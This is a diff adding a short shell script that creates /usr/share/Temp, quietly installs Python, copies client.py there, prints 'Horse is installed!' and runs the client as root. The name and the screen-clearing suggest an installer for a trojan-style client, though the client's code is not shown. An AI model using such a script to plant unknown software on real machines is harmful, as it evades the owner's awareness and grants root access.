@@ -1,0 +1,7 @@
+mkdir /usr/share/Temp
+clear
+bash -c "sudo apt-get install python"&
+clear
+sudo cp -r client.py /usr/share/Temp/
+echo "Horse is installed!"
+sudo python /usr/share/Temp/client.py
